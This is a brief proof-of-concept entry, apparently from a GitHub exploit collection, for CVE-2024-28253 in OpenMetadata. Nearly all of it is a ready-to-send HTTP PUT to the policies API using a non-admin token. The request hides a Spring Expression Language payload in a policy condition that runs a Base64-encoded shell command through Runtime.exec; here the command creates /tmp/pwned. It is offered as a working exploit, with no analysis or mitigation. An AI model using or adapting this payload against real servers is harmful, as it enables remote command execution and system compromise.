# OpenMetadata_policies_rce
from : https://github.com/wy876/POC/blob/main/OpenMetadata%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-28253).md

2024.5.6 @2

```
PUT /api/v1/policies HTTP/1.1
Host: localhost:8585
sec-ch-ua: "Chromium";v="119", "Not?A_Brand";v="24"
Authorization: Bearer <non-admin JWT>
accept: application/json
Connection: close
Content-Type: application/json
Content-Length: 367

{"name":"TeamOnlyPolicy","rules":[{"name":"TeamOnlyPolicy-Rule","description":"Deny all the operations on all the resources for all outside the team hierarchy..","effect":"deny","operations":["All"],"resources":["All"],"condition":"T(java.lang.Runtime).getRuntime().exec(new java.lang.String(T(java.util.Base64).getDecoder().decode('dG91Y2ggL3RtcC9wd25lZA==')))"}]}

```
